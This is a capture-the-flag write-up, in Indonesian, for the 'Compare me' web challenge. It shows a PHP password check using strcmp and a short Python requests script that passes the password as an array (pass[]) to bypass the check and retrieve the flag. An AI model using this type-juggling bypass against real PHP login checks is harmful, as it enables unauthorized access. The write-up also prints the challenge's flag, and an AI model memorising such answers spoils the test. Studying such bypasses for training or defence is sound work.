<h1><b>Compare me</h1></b>
<pre>
Source code can be found here

<a href='http://static.beast.sdslabs.co/static/Compare%20me/source.txt'>source.txt</a>

<a href='http://hack.bckdr.in:17582/'>link to challenge</a>
</pre>
</b><h3>Solution</h3></b>
<p align='justify'>Kita diminta untuk mengakses link http://hack.bckdr.in:17582/, dan disana terdapat pesan "NO FLAG FOR YOU". Sesuai judulnya yaitu compare me, ini kemungkinan
mengenai fungsi strcmp dari PHP, dan setelah diperhatikan disource codenya ternyata benar</p>

```php
if(strcmp($pass,$real_pass)==0){
        echo $flag;
    }
    else{
        echo "<h1>No Flag for you - Komi San</h1>";
    }
```
<p align='justify'>Di statment atas me-compare variabel pass dan real_pass, dimana pass yaitu hasil request dari pengguna. Untuk bypass fungsi strcmp yaitu menambahkan buka dan tutup kurung siko
seperti variabel pass menjadi pass[]</p>

```python3
import requests

url = 'http://hack.bckdr.in:17582/'
data = {"pass[]":"testing"}
res = requests.get(url,params=data).text
print(res) #flag{phpsadness.com}
```
<p>Dan flag didapatkan yaitu flag{phpsadness.com}</p>
</b><h3>Flag</h3></b>
<pre>
flag{phpsadness.com}
</pre>
